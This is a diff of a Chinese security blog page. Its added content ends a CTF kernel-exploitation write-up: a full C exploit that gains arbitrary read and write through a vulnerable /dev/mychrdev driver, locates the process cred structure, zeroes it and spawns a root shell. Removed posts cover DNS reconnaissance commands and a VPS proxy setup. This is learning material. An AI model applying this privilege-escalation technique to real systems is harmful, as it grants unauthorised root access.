+<p>利用<code>char target[16] = &quot;try2findmep4nda&quot;;prctl(PR_SET_NAME, target);</code>将<code>target</code>写进内核空间中，在内核空间中<code>targe</code>t的那个地址靠近<code>cred指针</code>，因此只要利用任意读爆破出它的地址就能够知道<code>cred</code>地址，利用任意写将<code>cred</code>中的前<code>0x28</code>个字节设置为0。这里可以参考<a href="http://p4nda.top/2018/11/07/stringipc/" target="_blank" rel="noopener">P4nda大神的博客</a>。    </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_hex(buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    buf[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_hex(buf, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
+<p>最后实现提权。</p>
+<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午11.18.18.png" alt="截屏2020-11-23 下午11.18.18"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> heap;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">id</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uid:%d\n"</span>, getuid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">    u_char buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1111</span>, buf);</span><br><span class="line">    u_char *p = buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(<span class="keyword">int</span> *)p);</span><br><span class="line">    p += <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, p);</span><br><span class="line">    p += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, *(<span class="keyword">int</span> *)p);</span><br><span class="line">    p += <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, *(<span class="keyword">long</span> *)p);</span><br><span class="line">    p += <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(<span class="keyword">size_t</span> *)p);</span><br><span class="line">    heap = *(<span class="keyword">size_t</span> *)p;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%lx"</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    id();</span><br><span class="line"></span><br><span class="line">    show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    u_char buf[<span class="number">0x10010</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> n = write(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> addr = <span class="number">0x10000</span>, pre_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred, real_cred, target_addr;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>] = <span class="string">"try2findmep4nda"</span>;</span><br><span class="line">    prctl(PR_SET_NAME, target);</span><br><span class="line">    <span class="keyword">for</span> (;; pre_addr = addr, addr += <span class="number">0x10000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf("pre_addr:0x%lX\n",heap-pre_addr);</span></span><br><span class="line">        <span class="comment">// printf("addr:0x%lX\n", heap-addr);</span></span><br><span class="line">        <span class="keyword">size_t</span> pos = pre_addr + <span class="number">0x10001</span>;</span><br><span class="line">        <span class="comment">// printf("pos:0x%lx\n", pos);</span></span><br><span class="line"></span><br><span class="line">        fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">        <span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// printf("0x%x\n", n);</span></span><br><span class="line">        <span class="comment">// *(size_t *)buf = -0x10000LL;</span></span><br><span class="line">        *(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        *(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">        n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">        fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">        n = lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">        n = read(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            u_int result = memmem(buf, <span class="number">0x10000</span>, target, <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> temp = buf + result - (u_int)buf;</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(temp - <span class="number">0x10</span>);</span><br><span class="line">                <span class="comment">// target_addr = heap - addr + result - (u_int)(buf);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pre_addr=addr;</span><br><span class="line">    <span class="keyword">size_t</span> mod=(real_cred&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">16</span>;</span><br><span class="line">    addr=heap-mod;</span><br><span class="line">    <span class="keyword">size_t</span> p_pos=real_cred-mod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf("%p\n", pre_addr);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", addr);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", mod);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", p_pos);</span></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    <span class="keyword">size_t</span> pos = pre_addr + <span class="number">0x10001</span>;</span><br><span class="line">    <span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">    n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">    n = lseek(fd, p_pos, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">    n = read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print_hex(buf,0x100);</span></span><br><span class="line">    <span class="comment">// printf("\n");</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x28</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print_hex(buf, 0x100);</span></span><br><span class="line"></span><br><span class="line">    fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    n = lseek(fd, p_pos, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">    n = write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    id();</span><br><span class="line">    <span class="comment">// close(fd);</span></span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这篇博客已经在发布在安全客上<a href="https://www.anquanke.com/post/id/223468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/223468</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/hxb-only-add/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -830,7 +1188,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2020/10/27/Linux-pwn/" class="post-title-link" itemprop="url">Linux_pwn</a>
+                <a href="/2020/10/27/Linux-pwn/" class="post-title-link" itemprop="url">kernel_pwn</a>
               
             
           </h1>
@@ -872,7 +1230,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-11-05 17:54:48" itemprop="dateModified" datetime="2020-11-05T17:54:48+08:00">2020-11-05</time>
+                <time title="Modified: 2020-11-10 14:26:02" itemprop="dateModified" datetime="2020-11-10T14:26:02+08:00">2020-11-10</time>
               
             
           </span>
@@ -1049,12 +1407,24 @@
                 
               
 
-              <time title="Created: 2020-10-26 19:57:46 / Modified: 20:15:40" itemprop="dateCreated datePublished" datetime="2020-10-26T19:57:46+08:00">2020-10-26</time>
+              <time title="Created: 2020-10-26 19:57:46" itemprop="dateCreated datePublished" datetime="2020-10-26T19:57:46+08:00">2020-10-26</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-12-07 22:55:12" itemprop="dateModified" datetime="2020-12-07T22:55:12+08:00">2020-12-07</time>
               
             
           </span>
@@ -1397,7 +1767,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-11-05 23:18:25" itemprop="dateModified" datetime="2020-11-05T23:18:25+08:00">2020-11-05</time>
+                <time title="Modified: 2020-12-07 22:54:40" itemprop="dateModified" datetime="2020-12-07T22:54:40+08:00">2020-12-07</time>
               
             
           </span>
@@ -1712,386 +2082,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/dns-collect/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xkaneiki">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/01/27/dns-collect/" class="post-title-link" itemprop="url">DNS收集</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-01-27 23:59:39" itemprop="dateCreated datePublished" datetime="2020-01-27T23:59:39+08:00">2020-01-27</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-21 00:51:34" itemprop="dateModified" datetime="2020-10-21T00:51:34+08:00">2020-10-21</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="DNS收集"><a href="#DNS收集" class="headerlink" title="DNS收集"></a>DNS收集</h1><h2 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h2><ol>
-<li><strong><em>A记录</em></strong>，正向解析，域名toIP</li>
-<li><strong><em>PTR记录</em></strong>，反向解析，IPto域名</li>
-<li><strong><em>CNME记录</em></strong>，别名</li>
-<li><strong><em>MX记录</em></strong>，mail.xxx.com，指向一个邮件服务器</li>
-<li><strong><em>NS服务器</em></strong>，dns.xxx.com，指向域名有哪个dns服务器进行查询</li>
-<li><strong><em>TXT记录</em></strong>,主机域名的查询</li>
-</ol>
-<h2 id="DNS查询方式"><a href="#DNS查询方式" class="headerlink" title="DNS查询方式"></a>DNS查询方式</h2><ol>
-<li>递归查询</li>
-<li>迭代查询&lt;-&lt;-&lt;-</li>
-</ol>
-<h2 id="常用的IP命令"><a href="#常用的IP命令" class="headerlink" title="常用的IP命令"></a>常用的IP命令</h2><ol>
-<li><p>ping</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>nslookup</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>dig</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dig @&lt;DNS地址&gt; any/192.168.1.1 #显示所有域名的记录</span><br><span class="line">	</span><br><span class="line">dig -x www.baidu.com#反向查询,通过IP查域名</span><br><span class="line"></span><br><span class="line">dig txt chaos VERSION.BIND &lt;dns服务器@ns3.dnsv4.com&gt;#查询dns服务器的bind的版本信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>DNS配置文件地址：/etc/resolv.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf#显示dns配置信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>whois</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois www.baidu.com #查询网站的域名注册信息和备案信息</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="查询域名注册和备案信息的网站"><a href="#查询域名注册和备案信息的网站" class="headerlink" title="查询域名注册和备案信息的网站"></a>查询域名注册和备案信息的网站</h2><ol>
-<li><a href="https://www.whois.aliyun.com/" target="_blank" rel="noopener">阿里云</a></li>
-<li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li>
-<li><a href="https://icp.chinaz.com" target="_blank" rel="noopener">ChinaZ</a></li>
-</ol>
-<h2 id="使用Maltego-CE收集子域名信息"><a href="#使用Maltego-CE收集子域名信息" class="headerlink" title="使用Maltego CE收集子域名信息"></a>使用Maltego CE收集子域名信息</h2><ol>
-<li>注册一个账号（需要用翻墙）[]</li>
-<li>打开kali的matlego选择matlego CE（free）</li>
-<li>安装PATERVA CTAS CE就可以使用了</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/vps-build/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xkaneiki">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/01/26/vps-build/" class="post-title-link" itemprop="url">VPS服务器配置</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-01-26 04:48:32" itemprop="dateCreated datePublished" datetime="2020-01-26T04:48:32+08:00">2020-01-26</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-11-05 21:54:52" itemprop="dateModified" datetime="2020-11-05T21:54:52+08:00">2020-11-05</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/网络安全/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="去搬瓦工买一台服务器"><a href="#去搬瓦工买一台服务器" class="headerlink" title="去搬瓦工买一台服务器"></a>去搬瓦工买一台服务器</h1><ul>
-<li><a href="https://bwh88.net/aff.php?aff=47237" target="_blank" rel="noopener">搬瓦工地址</a></li>
-<li>安装centos系统<h1 id="用ssh远程登陆服务器"><a href="#用ssh远程登陆服务器" class="headerlink" title="用ssh远程登陆服务器"></a>用ssh远程登陆服务器</h1></li>
-<li>任意的ssh工具即可</li>
-<li>在搬瓦工页面找到服务器地址和ssh端口号<!-- <img src="/2020/01/26/vps-build/example.png" title="[example]"> -->
-<img src="/2020/01/26/vps-build/example.png" alt><h1 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h1></li>
-</ul>
-<ol>
-<li><p>输入命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget –no-check-certificate  https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line"></span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置密码和端口号</p>
-</li>
-<li>选择加密方式为aes-256-cfb</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2138,7 +2128,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-count">18</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
